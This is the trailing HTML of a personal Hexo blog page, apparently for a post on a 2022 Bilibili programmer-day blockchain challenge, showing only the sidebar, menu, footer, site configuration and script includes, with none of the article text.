        d="M362.58,182.21c4.66-.33,9.66,1.17,15,4.5,5.33,3.34,7.66,7.5,7,12.5-.67,2.34-1.92,4.92-3.75,7.75-1.84,2.84-4,5.5-6.5,8s-4.84,4.75-7,6.75c-2.17,2-3.75,3.17-4.75,3.5-2.67,1.67-5.34,2.25-8,1.75-2.67-.5-5-1.5-7-3s-3.59-3.33-4.75-5.5c-1.17-2.16-1.92-4.25-2.25-6.25-.34-2,.16-4.66,1.5-8,1.33-3.33,3.08-6.58,5.25-9.75,2.16-3.16,4.58-6,7.25-8.5,2.66-2.5,5.33-3.75,8-3.75Z"
      ></path>
    </g>
  </svg>
  <div class="description" itemprop="description">月遇从云 花遇和风</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">53</span>
        <span class="name">文章</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">46</span>
        <span class="name">标签</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL29hY2lh" title="https:&#x2F;&#x2F;github.com&#x2F;oacia"><i class="ic i-github"></i></span>
      <a target="_blank" rel="noopener" href="https://twitter.com/oacia86" title="https:&#x2F;&#x2F;twitter.com&#x2F;oacia86" class="item twitter"><i class="ic i-twitter"></i></a>
      <span class="exturl item paper-plane" data-url="aHR0cHM6Ly90Lm1lL29hY2lh" title="https:&#x2F;&#x2F;t.me&#x2F;oacia"><i class="ic i-paper-plane"></i></span>
      <span class="exturl item email" data-url="bWFpbHRvOm9hY2lhODZAZ21haWwuY29t" title="mailto:oacia86@gmail.com"><i class="ic i-envelope"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/about-oacia/" rel="section"><i class="ic i-user"></i>关于oacia</a>
  </li>

    
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-feather"></i>文章</a>
  </li>

    
  <li class="item">
    <a href="/TODOlist/" rel="section"><i class="ic i-clock"></i>要做的事</a>
  </li>

    
  <li class="item">
    <a href="/website_maintenance/" rel="section"><i class="ic i-calendar"></i>更新日志</a>
  </li>

    
  <li class="item">
    <a href="/friends/" rel="section"><i class="ic i-heart"></i>小伙伴</a>
  </li>

    
  <li class="item">
    <a href="/music/" rel="section"><i class="ic i-music"></i>听会儿歌吧</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/solidity-learning/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/%E7%94%A8c%E8%B0%83%E7%94%A8python/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div>
  <h2>最新评论</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2022 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">oacia @ oacia</span>
  </div>
  <div class="count">
    <span class="post-meta-item-icon">
      <i class="ic i-chart-area"></i>
    </span>
    <span title="站点总字数">968k 字</span>

    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="ic i-coffee"></i>
    </span>
    <span title="站点阅读时长">14:40</span>
  </div>
  <div class="powered-by">
    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>



<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022哔哩哔哩_1024程序员节_T4_区块链详解/',
    favicon: {
      show: "柚鳥ナツ",
      hide: "甘い幸せ"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,
    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>
<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>


<script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
